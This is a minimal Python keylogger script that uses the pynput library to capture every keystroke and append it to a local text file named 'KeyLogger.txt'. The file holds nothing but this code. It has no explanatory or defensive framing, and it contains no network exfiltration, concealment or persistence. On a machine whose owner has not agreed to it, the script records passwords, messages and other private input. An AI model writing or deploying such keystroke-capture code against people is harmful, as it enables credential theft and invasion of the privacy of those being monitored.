import pynput

with open(" KeyLogger.txt ", "w") as log:
    log.write("")

def on_press(key):
    with open(" KeyLogger.txt ", "a") as log:
        log.write(f"{key}\n")

with pynput.keyboard.Listener(on_press= on_press) as listener:
    listener.join()